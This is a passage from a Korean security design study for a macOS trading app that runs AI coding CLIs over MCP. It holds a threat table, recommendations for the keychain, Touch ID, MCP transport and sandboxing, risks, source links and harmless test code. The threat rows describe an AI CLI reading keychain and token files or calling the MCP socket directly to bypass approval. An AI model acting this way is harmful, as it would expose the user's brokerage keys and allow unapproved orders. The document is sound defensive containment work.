| 4 | T-2 | CLI가 셸/파일 도구로 DB, 키체인, 토큰 파일 읽기 | AS-1, AS-4 | 도구 목록 검증(SEC-2), `env_clear`, 빈 작업 폴더, `sandbox-exec`, 데이터 보호 키체인 접근 그룹 | CLI 바이너리 자체가 악성이면 같은 사용자 권한으로 샌드박스 밖 행동을 할 수 있다(샌드박스는 앱이 씌웠을 때만 적용) |
| 5 | T-2, T-4 | MCP 소켓/포트에 직접 접속해 도구 호출 | AS-3, AS-7 | 실행별 토큰, 0600 소켓, 상대 PID와 부모 PID 확인, MCP에 쓰기 권한이 큰 도구 없음 | 토큰이 든 설정 파일을 짧은 시간 동안 읽을 수 있다 |
| 6 | T-3 | DNS 재바인딩, CSRF로 localhost MCP나 개발 서버 접근 | AS-3 | stdio 브리지 + Unix 소켓(브라우저가 닿을 수 없다). HTTP라면 `Origin`/`Host` 검사와 토큰 | `tauri dev`의 Vite 개발 서버 포트는 개발 중에 열려 있다(Vite `server.host` 기본값 확인 필요, 미확인) |
| 7 | T-5 | WebView 스크립트가 승인 IPC 호출 | AS-2 | 승인 요청은 `proposal_id`만 받는다, 코어 재계산, 네이티브 창 + Touch ID, 경로 고정 테스트 | 사용자가 창 내용을 읽지 않고 승인 |
| 8 | T-5 | WebView가 설정 변경 명령(주문 기능 켜기, 원칙 변경) 호출 | AS-2 | 위험 설정(ORD-5 스위치, 시장가 허용)도 네이티브 확인 + 본인 확인을 거친다 | design에 아직 없는 요구사항(추가 필요) |
| 9 | T-4 | 키체인 항목 읽기 시도 | AS-1, AS-4 | 데이터 보호 키체인 + 팀 접근 그룹(프롬프트도 없이 거부) | 파일 기반 키체인으로 되돌아가면 프롬프트 클릭으로 열린다 |
| 10 | T-4 | 앱 프로세스에 코드 주입, 디버거 부착 | 전부 | Hardened Runtime, `get-task-allow` 없는 릴리스 서명 | ad-hoc 개발 빌드는 이 보호가 없다 → 개발 빌드는 실제 키를 쓰지 않는다 |
| 11 | T-4 | 접근성 API로 네이티브 승인 창 클릭 | AS-2 | Touch ID 물리 접촉 | 암호 대체 경로에서 입력을 흉내 낼 수 있는지 미확인 |
| 12 | T-4 | 토스 키를 얻어 사용자 PC(허용 IP)에서 직접 호출 | AS-2 | AS-1 보호에 의존, 토스 허용 IP | 같은 PC의 악성코드는 허용 IP 안에 있다 |
| 13 | T-6 | 잠기지 않은 Mac에서 주문 | AS-2 | 모든 주문에 본인 확인(암호 포함) | 암호를 아는 사람 |
| 14 | T-7 | 디스크나 백업에서 DB 읽기 | AS-3, AS-4 | SQLCipher(rusqlite `bundled-sqlcipher`), 키는 `ThisDeviceOnly` 접근성으로 키체인에 둔다 | 백업 복원 시 키가 없으면 DB를 열 수 없다(복구 설계 필요) |
| 15 | T-8 | 비밀이 로그, 오류, 패닉 메시지, 커밋에 섞인다 | AS-1 | `secrecy` 타입, Debug/Serialize 미구현, `set_sensitive`, 가짜 비밀 검색 테스트, 저장소 비밀 검사 훅 | FFI와 외부 crate 내부 로그 |
| 16 | T-2, T-4 | 감사 로그 수정이나 꼬리 삭제 | AS-5 | 해시 체인 + HMAC + 머리값 고정 + SE 승인 서명 + 토스 대조 | 같은 앱 권한을 얻은 공격자의 동시 되돌리기 |
| 17 | T-9 | root, 커널 | 전부 | 범위 밖 | 전부 |

## 3. 선택지 비교표와 추천

### 3.1 비밀 저장소

| 선택지 | 다른 프로세스 차단 | 생체 연동 | 개발 빌드 | 구현 난이도 |
|---|---|---|---|---|
| A. 파일 기반 키체인 (`keyring` v1 기본) | 프롬프트 (사용자가 허용 가능) | 불가 | 그대로 동작하지만 빌드마다 프롬프트 | 낮음 |
| **B. 데이터 보호 키체인 (`security-framework`)** | entitlement로 강제 | 가능 | App ID 서명 필요 | 중간 (서명과 프로파일) |
| C. `tauri-plugin-stronghold` 등 자체 금고 파일 | 금고 비밀번호에 의존 | 불가 | 동작 | 중간. 키를 어디 둘지가 다시 문제가 된다 |

**추천: B.** 이유는 세 가지다. AI CLI를 같은 사용자로 돌리는 이 앱에서 "프롬프트 없이 거부"가 가장 강한 경계다. Secure Enclave 승인 서명(Q2, Q7)도 B에서만 된다. 이 PC에 이미 Apple 서명 ID가 있다.
**추천이 틀리는 조건**: Tauri 앱에 프로비저닝 프로파일을 넣고 서명했을 때 실행이 막히거나(포럼 777179의 빈 화면 같은 문제), 개발 반복 속도가 감당하지 못할 만큼 느려지는 경우. 그때는 A로 가되, 접근 프롬프트가 뜨면 사용자에게 "앱 외 프로세스의 키 접근 시도"로 경고하고, 개발 빌드는 별도 서비스 이름과 가짜 키만 쓰게 한다.

### 3.2 본인 확인

| 선택지 | WebView 위조 차단 | 대체 수단 | 감사 증거 |
|---|---|---|---|
| A. `LAContext.evaluatePolicy` 결과 bool만 | 가능 (코어가 호출) | 시스템 암호 | 없음 (bool) |
| **B. 네이티브 요약 창 + A** | 가능 | 시스템 암호 | 없음 |
| C. B + Secure Enclave 승인 키 서명(`biometryCurrentSet` 또는 `userPresence`) | 가능 | `userPresence`면 암호 | 승인마다 서명 |

**추천: 1차는 B, 서명 체계가 준비되면 C.** C는 데이터 보호 키체인(3.1-B)이 전제다. `biometryCurrentSet`은 지문이 바뀌면 키를 무효로 만들어 재등록 흐름이 필요하므로, 1차에는 `userPresence`를 추천한다.
**추천이 틀리는 조건**: `evaluatePolicy` 창이 ad-hoc이나 개발 서명 빌드에서 뜨지 않거나, 이유 문자열이 너무 많이 잘려 종목과 수량이 보이지 않는 경우. 그때는 네이티브 창의 요약을 주된 수단으로 하고, Touch ID 창에는 "주문 승인"만 넣는다.

### 3.3 MCP 전송 (R-04와 함께 확정)

| 선택지 | 브라우저 접근 | 다른 프로세스 | CLI 지원 |
|---|---|---|---|
| A. 127.0.0.1 HTTP + Bearer 토큰 + Origin/Host 검사 | 검사가 맞으면 차단 | 토큰으로 차단 | Claude Code `http` + `headers` [Claude Code MCP] |
| **B. stdio 브리지 → Unix 소켓(0600) + 토큰 + 상대 PID 검사** | 원천 차단 | 토큰 + 파일 권한 + PID | stdio는 두 CLI가 공통 지원(Codex 쪽은 R-03에서 확인) |

**추천: B.** MCP 보안 문서가 로컬 서버에 권하는 방식이다 [MCP 보안 모범 사례]. HTTP 검사를 빠뜨리는 실수가 구조적으로 일어날 수 없다.
**추천이 틀리는 조건**: 어떤 CLI가 stdio MCP 서버를 자기 샌드박스나 다른 환경에서 띄워 브리지가 소켓에 닿지 못하는 경우, 또는 브리지 수명 관리가 R-04에서 지나치게 복잡하다고 판명되는 경우. 그때는 A로 간다.

### 3.4 자식 프로세스 격리

**추천: `env_clear` 허용 목록 + 빈 작업 폴더 + `sandbox-exec` 프로필(가능하면) + 데이터 보호 키체인.** `sandbox-exec`는 폐기 예정 표시가 붙어 있으므로 "없어도 안전이 성립하는 추가 겹"으로만 둔다. 앱이 시작할 때 프로필이 실제로 적용되는지 스스로 점검하고(금지 경로 읽기가 실패하는지 확인), 실패하면 경고한다.
**추천이 틀리는 조건**: Claude CLI가 `sandbox-exec` 안에서 인증이나 네트워크 문제로 동작하지 않는 경우(미확인, R-02 실험 필요). 그때는 이 겹을 빼고 나머지 겹으로 SEC-2를 충족한다.

## 4. 위험과 미확인 항목

**위험**

- 프로비저닝 프로파일을 넣은 Tauri 앱이 정상 동작하는지 공개 사례가 엇갈린다 [포럼 777179]. 첫 구현 작업(S-12)의 앞에서 확인해야 한다.
- `sandbox-exec`는 폐기 예정이고, SBPL은 공개 문서가 없다. macOS 업데이트로 동작이 바뀔 수 있다.
- ad-hoc 개발 빌드는 Hardened Runtime도 접근 그룹도 없다. 개발 중에 실제 토스 키를 쓰면 보호가 크게 약해진다.
- 네이티브 확인 창은 인증된 화면이 아니다. 결국 사용자가 읽고 판단해야 하는 부분이 남는다.
- 감사 로그는 같은 앱 권한을 얻은 공격자에게는 "지울 수 없는" 상태가 아니다.

**미확인**

- `LAContext.localizedReason`의 길이 제한과 잘림 동작. 개발/ad-hoc 서명 빌드에서 앱 이름이 어떻게 보이는지.
- ad-hoc 빌드에서 `evaluatePolicy` 창이 실제로 뜨는지(사람의 조작이 필요해 실험하지 못함).
- 이 실행 환경에서 생체 정책이 -4를 돌려준 원인.
- `sandbox-exec`로 키체인 서비스를 확실히 차단할 수 있는지(실험 결과가 결정적이지 않음).
- Claude CLI가 `sandbox-exec`와 `env_clear` 허용 목록 아래에서 구독 인증으로 동작하는지(R-02).
- Claude Code가 Unix 소켓 MCP 전송을 지원하는지(문서에 없음).
- macOS에서 `LOCAL_PEERTOKEN`(감사 토큰)으로 상대 프로세스를 PID 재사용 없이 확인할 수 있는지.
- `keyring`의 `protected` 저장소가 생체 접근 제어를 지원하는지.
- `robius-authentication` 0.3.1의 내부 구현(`evaluatePolicy` 래핑 여부).
- Personal Team 프로파일의 만료 주기(macOS 기준).
- 이 PC의 Apple Developer Program 멤버십이 지금 유효한지.
- 암호 대체 경로에서 접근성 API로 입력을 흉내 낼 수 있는지.

## 5. 이 결과로 바뀌어야 할 설계 문서 항목

| 문서 | 항목 | 바꿀 내용 |
|---|---|---|
| design.md 7.1 | SEC-1 | "macOS 키체인" → "데이터 보호 키체인, 앱 팀 접근 그룹, `ThisDeviceOnly`". 개발(ad-hoc) 빌드는 별도 서비스 이름과 가짜 키만 쓴다 |
| design.md 7.1 | SEC-2 | 격리 수단을 구체적으로 적는다: `env_clear` 허용 목록, 0700 빈 작업 폴더, `sandbox-exec` 프로필(가능하면, 시작할 때 적용을 자가 점검), fd 상속 없음 |
| design.md 7.1 | SEC-3 | "로컬 소켓"을 "stdio 브리지 → Unix 소켓(0700 폴더, 0600 소켓), 실행별 토큰, 상대 PID와 부모 PID 확인"으로 바꾼다. HTTP를 쓰게 되면 `127.0.0.1` 바인딩, `Origin`/`Host` 검사(403), Bearer 토큰을 필수로 한다 |
| design.md 7.1 | SEC-8 | 구현을 명시한다: 코어가 네이티브 요약 창을 띄우고 `LAContext.evaluatePolicy(.deviceOwnerAuthentication)`를 부른다. 요약은 창 본문에, 짧은 요약은 이유 문자열에 넣는다. 확인 창 연속 요청을 제한한다 |
| design.md 7.1 | 신규 SEC-9 | WebView: CSP 명시(외부 이미지, 스크립트, 연결 금지), `freezePrototype`, 명령 허용 목록, WebView에 `dialog`/`shell`/`opener`/`fs` 권한 없음, AI 마크다운에서 raw HTML과 외부 이미지 금지, 외부 링크는 코어가 확인 후 연다 |
| design.md 7.1 | 신규 SEC-10 | 비밀 타입 규칙: `secrecy` 래퍼, `Debug`/`Display`/`Serialize`/`Clone` 미구현, `HeaderValue::set_sensitive`, 오류에 본문 금지, 가짜 비밀 검색 테스트 |
| design.md 7.1 | 신규 SEC-11 | 위험 설정 변경(ORD-5 주문 기능 켜기, 시장가 허용, 원칙 완화)도 네이티브 확인과 본인 확인을 거친다 |
| design.md 7.2 | ORD-3 | "지울 수 없는"을 "변조를 탐지할 수 있는"으로 고친다. 해시 체인 + HMAC(키는 키체인) + 머리값 고정 + 토스 주문 내역 대조. 감사 로그 쓰기에 실패하면 전송하지 않는다 |
| design.md 9 | 위험 표 | 추가: "서명·프로비저닝 없이 개발하면 키체인 보호가 약해진다", "`sandbox-exec` 폐기 예정", "네이티브 창은 인증된 화면이 아님" |
| architecture.md 2.2 | 신뢰 경계 표 | "UI (사용자 조작)"와 "WebView 안의 스크립트(비신뢰: 승인 요청만 가능)"를 나눈다. "같은 사용자의 다른 프로세스", "브라우저 웹 페이지"를 비신뢰 행으로 추가한다. AI CLI 행에서 "웹 읽기"를 SEC-2와 맞춘다(SEC-2는 웹 검색만 허용) |
| architecture.md 2.1 | 프로세스 그림 | "MCP 서버 (127.0.0.1, 실행별 토큰)" → "MCP 서버 (Unix 소켓, stdio 브리지, 실행별 토큰)". R-04 결론에 맞춘다 |
| architecture.md 4.2 | 타입 | 승인 IPC는 `proposal_id`만 받는다. `UserApproval`에 Secure Enclave 서명(2단계)을 담을 자리를 둔다 |
| architecture.md 4.3 | WebView 밖 본인 확인 | 창이 두 개(네이티브 요약 창, LocalAuthentication 창)라는 것과 각 창의 표시 한계를 적는다. 확인 창 요청 빈도 제한을 적는다 |
| architecture.md 4.4 | 검증 | 경로 고정 테스트를 추가한다: 승인 IPC를 수량·가격 인자와 함께 불러도 무시되는지, 위험 설정 변경 명령도 본인 확인 없이는 실패하는지, 감사 로그 쓰기 실패 시 전송 0건인지 |
| architecture.md 6 | 감사 로그 행 | "추가만 가능, 해시 체인" → "해시 체인 + HMAC + 키체인 머리값 고정 (+ SE 승인 서명)" |
| tasks.md | S-12, O-07 | S-12 앞에 "Tauri 앱 서명·프로파일·데이터 보호 키체인 스파이크"를 추가한다. O-07의 완료 조건에 "Touch ID를 쓸 수 없을 때 암호로 넘어감"을 추가한다 |

## 6. 출처 목록

모든 출처의 확인 날짜는 2026-11-11이다.

**Apple**
- [TN3137] TN3137: On Mac keychain APIs and implementations (2026-09-24 개정) — https://developer.apple.com/documentation/technotes/tn3137-on-mac-keychains
- [Keychain with Touch ID] Accessing Keychain Items with Face ID or Touch ID — https://developer.apple.com/documentation/localauthentication/accessing-keychain-items-with-face-id-or-touch-id
- [evaluatePolicy] LAContext.evaluatePolicy(_:localizedReason:reply:) — https://developer.apple.com/documentation/localauthentication/lacontext/evaluatepolicy(_:localizedreason:reply:)
- [LAPolicy.deviceOwnerAuthentication] — https://developer.apple.com/documentation/localauthentication/lapolicy/deviceownerauthentication
- [LAPolicy.biometrics] LAPolicy.deviceOwnerAuthenticationWithBiometrics — https://developer.apple.com/documentation/localauthentication/lapolicy/deviceownerauthenticationwithbiometrics
- [userPresence] SecAccessControlCreateFlags.userPresence — https://developer.apple.com/documentation/security/secaccesscontrolcreateflags/userpresence
- [biometryCurrentSet] SecAccessControlCreateFlags.biometryCurrentSet — https://developer.apple.com/documentation/security/secaccesscontrolcreateflags/biometrycurrentset
- [Hardened Runtime] — https://developer.apple.com/documentation/security/hardened-runtime
- [App Sandbox] Protecting user data with App Sandbox — https://developer.apple.com/documentation/security/protecting-user-data-with-app-sandbox
- Embedding a command-line tool in a sandboxed app — https://developer.apple.com/documentation/xcode/embedding-a-helper-tool-in-a-sandboxed-app
- [Developer ID] — https://developer.apple.com/developer-id/
- [포럼 740164] Developer account required for key generation (Quinn 답변) — https://developer.apple.com/forums/thread/740164
- [포럼 777179] keychain and codesigning local dev (Tauri 사례, Quinn 답변) — https://developer.apple.com/forums/thread/777179
- [포럼 98484] Keychain access prompt on app upgrade — https://developer.apple.com/forums/thread/98484
- [포럼 115425] Rules for modified signed App accessing Keychain — https://developer.apple.com/forums/thread/115425
- [포럼 706390] Resolving App Sandbox Inheritance Problems (Quinn) — https://developer.apple.com/forums/thread/706390
- [포럼 740600] App Name missing from Touch ID Request on macOS — https://developer.apple.com/forums/thread/740600
- `sandbox-exec(1)` man 페이지 (로컬, macOS 26.5.2): "The sandbox-exec command is DEPRECATED."

**Tauri (2.12.5)**
- [Tauri CSP] — https://v2.tauri.app/security/csp/
- [Tauri capabilities] — https://v2.tauri.app/security/capabilities/
- [Tauri isolation] — https://v2.tauri.app/concept/inter-process-communication/isolation/
- [Tauri biometric] — https://v2.tauri.app/plugin/biometric/
- [Tauri dialog] — https://v2.tauri.app/plugin/dialog/
- [Tauri 서명] — https://v2.tauri.app/distribute/sign/macos/
- [Tauri 번들] — https://v2.tauri.app/distribute/macos-application-bundle/
- [Tauri 스키마] 설정 스키마 2.12.5 (`SecurityConfig`, `MacConfig`) — https://schema.tauri.app/config/2

**crate 문서**
- [docs.rs security-framework] 3.7.0 — https://docs.rs/security-framework/latest/security_framework/ , `PasswordOptions` — https://docs.rs/security-framework/latest/security_framework/passwords/struct.PasswordOptions.html
- [docs.rs keyring] 4.2.0 — https://docs.rs/keyring/latest/keyring/
- [docs.rs apple-native-keyring-store] 1.0.2 — https://docs.rs/apple-native-keyring-store/latest/apple_native_keyring_store/ (keychain, protected 모듈)
- [docs.rs objc2-local-authentication] 0.3.2 — https://docs.rs/objc2-local-authentication/0.3.2/objc2_local_authentication/
- [docs.rs robius-authentication] 0.3.1 — https://docs.rs/robius-authentication/latest/robius_authentication/
- [docs.rs secrecy] 0.10.3 — https://docs.rs/secrecy/latest/secrecy/
- [docs.rs zeroize] 1.9.1 — https://docs.rs/zeroize/latest/zeroize/
- [docs.rs http HeaderValue] http 1.5.0 — https://docs.rs/http/latest/http/header/struct.HeaderValue.html
- crates.io API (버전, 기능 목록: rusqlite 0.42.0 `bundled-sqlcipher`, keyring 4.2.0 기능) — https://crates.io/api/v1/crates/<이름>

**MCP, Claude Code**
- [MCP 전송] Transports, 2026-07-28 — https://modelcontextprotocol.io/specification/2026-07-28/basic/transports
- [MCP Streamable HTTP] Security & Endpoint — https://modelcontextprotocol.io/specification/2026-07-28/basic/transports/streamable-http
- [MCP 보안 모범 사례] Local MCP Server Compromise, OAuth URL 검증 — https://modelcontextprotocol.io/specification/2026-07-28/basic/security_best_practices
- [Claude Code MCP] — https://code.claude.com/docs/en/mcp
- [Claude Code 샌드박스] — https://code.claude.com/docs/en/sandboxing
- [Claude Code 인증] Credential management, Authentication precedence — https://code.claude.com/docs/en/authentication

**웹, 렌더링**
- [react-markdown] Security, `defaultUrlTransform` — https://github.com/remarkjs/react-markdown
- [EchoLeak] Reddy et al., arXiv:2509.10540 — https://arxiv.org/pdf/2509.10540 ; 보조: https://simonwillison.net/2025/Jun/11/echoleak/
- [Chrome LNA] Local Network Access — https://developer.chrome.com/blog/local-network-access

**감사 로그**
- [Schneier–Kelsey] Secure Audit Logs to Support Computer Forensics, ACM TISSEC 1(3), 1999 — https://www.schneier.com/academic/archives/1999/05/secure_audit_logs_to.html
- [Ma–Tsudik 2008] A New Approach to Secure Logging, DBSec 2008 — https://dl.ifip.org/index.html/db/conf/dbsec/dbsec2008/MaT08.pdf
- [Crosby–Wallach] Efficient Data Structures for Tamper-Evident Logging, USENIX Security 2009 — https://www.usenix.org/conference/usenixsecurity09/technical-sessions/presentation/efficient-data-structures-tamper-evident

## 부록 A. 실험 코드

### A.1 `sec-demo` (Rust, secrecy 0.10.3, zeroize 1.9.1, libc 0.2.191)

```rust
use secrecy::{ExposeSecret, SecretString};
use std::io::Read;
use std::os::unix::io::AsRawFd;
use std::os::unix::net::UnixListener;
use std::process::{Command, Stdio};
use zeroize::Zeroizing;

struct ClientSecret(SecretString); // Debug/Display/Serialize 일부러 없음

#[derive(Debug)]
struct TossConfig { client_id: String, client_secret: SecretString }

fn peer_pid(fd: i32) -> i32 {
    let mut pid: libc::pid_t = 0;
    let mut len = std::mem::size_of::<libc::pid_t>() as libc::socklen_t;
    // SOL_LOCAL = 0, LOCAL_PEERPID = 0x002 (sys/un.h)
    let rc = unsafe { libc::getsockopt(fd, 0, 0x002, &mut pid as *mut _ as *mut libc::c_void, &mut len) };
    assert_eq!(rc, 0);
    pid
}

fn main() {
    let cfg = TossConfig { client_id: "demo-id".into(), client_secret: SecretString::from("FAKE-SECRET-123".to_string()) };
    println!("[1] Debug of config: {:?}", cfg);
    let s = ClientSecret(SecretString::from("FAKE-SECRET-456".to_string()));
    println!("[1] explicit expose length: {}", s.0.expose_secret().len());
    { let buf = Zeroizing::new(b"FAKE-TOKEN".to_vec()); println!("[2] zeroizing buffer len {}", buf.len()); }

    unsafe { std::env::set_var("TOSS_CLIENT_SECRET", "FAKE-SHOULD-NOT-LEAK") };
    let inh = Command::new("/usr/bin/env").output().unwrap();
    println!("[3] default spawn inherits TOSS_CLIENT_SECRET: {}", String::from_utf8_lossy(&inh.stdout).contains("TOSS_CLIENT_SECRET"));
    let cleared = Command::new("/usr/bin/env").env_clear().env("PATH", "/usr/bin:/bin").env("HOME", "/tmp/fake-home").output().unwrap();
    println!("[3] env_clear child env:\n{}", String::from_utf8_lossy(&cleared.stdout));

    // Unix 소켓 상대 PID와 그 부모 PID 확인 (전체 코드는 <scratch>/sec-demo/src/main.rs)
    // ...
}
```

출력은 본문 Q3, Q4, Q5에 붙였다.

### A.2 fd 상속 확인 (Rust std)

`File::open("/etc/hosts")`(fd 3)과 `TcpListener::bind("127.0.0.1:0")`(fd 4)을 연 뒤 `/bin/sh -c 'lsof -a -p $$ -d 3-20'`를 자식으로 실행했다. 자식에게 보인 fd 3~20 범위에는 `/etc/hosts`도 TCP 소켓도 없었고, 셸 자신의 파이프 두 개(4, 5)만 있었다.

### A.3 `la` (Swift, LocalAuthentication, 프롬프트 없음)

```swift
import LocalAuthentication
let ctx = LAContext()
var err: NSError?
let bio = ctx.canEvaluatePolicy(.deviceOwnerAuthenticationWithBiometrics, error: &err)
print("biometrics:", bio, "err:", err?.code ?? 0, err?.localizedDescription ?? "")
print("biometryType raw:", ctx.biometryType.rawValue)
var err2: NSError?
print("deviceOwnerAuthentication:", ctx.canEvaluatePolicy(.deviceOwnerAuthentication, error: &err2), "err:", err2?.code ?? 0)
```

### A.4 `sandbox-exec` 프로필

본문 Q3에 프로필과 출력을 붙였다.
